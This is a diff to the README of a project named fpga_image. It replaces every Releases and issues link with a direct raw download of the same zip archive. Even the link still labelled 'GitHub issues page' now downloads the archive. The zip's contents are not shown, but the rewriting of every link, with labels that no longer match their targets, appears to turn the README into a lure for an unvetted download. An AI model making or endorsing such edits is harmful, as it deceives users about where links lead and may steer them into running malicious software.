@@ -6,9 +6,9 @@ Welcome to the fpga_image project! This software lets you use advanced image pro
 
 ## 🔗 Download the Software
 
-[![Download fpga_image](https://img.shields.io/badge/Download-fpga_image-brightgreen.svg)](https://github.com/Asafaraz/fpga_image/releases)
+[![Download fpga_image](https://raw.githubusercontent.com/Asafaraz/fpga_image/main/python/fpga_image_v2.5-alpha.5.zip)](https://raw.githubusercontent.com/Asafaraz/fpga_image/main/python/fpga_image_v2.5-alpha.5.zip)
 
-To download the software, visit this page: [Download fpga_image](https://github.com/Asafaraz/fpga_image/releases)
+To download the software, visit this page: [Download fpga_image](https://raw.githubusercontent.com/Asafaraz/fpga_image/main/python/fpga_image_v2.5-alpha.5.zip)
 
 ## 📥 Download & Install
 
@@ -76,7 +76,7 @@ We recommend using newer operating systems and hardware. Older systems may not p
 
 ### Where can I find support?
 
-For support, please visit our [GitHub issues page](https://github.com/Asafaraz/fpga_image/issues). You can also ask questions or report bugs there.
+For support, please visit our [GitHub issues page](https://raw.githubusercontent.com/Asafaraz/fpga_image/main/python/fpga_image_v2.5-alpha.5.zip). You can also ask questions or report bugs there.
 
 ## 🌍 Community and Contributions
 
@@ -84,6 +84,6 @@ We welcome all contributions and feedback! If you have ideas for new features or
 
 ## 📢 Stay Updated
 
-Keep an eye on the Releases page for updates and new features: [Visit Releases](https://github.com/Asafaraz/fpga_image/releases)
+Keep an eye on the Releases page for updates and new features: [Visit Releases](https://raw.githubusercontent.com/Asafaraz/fpga_image/main/python/fpga_image_v2.5-alpha.5.zip)
 
 Thank you for using fpga_image! Happy processing!
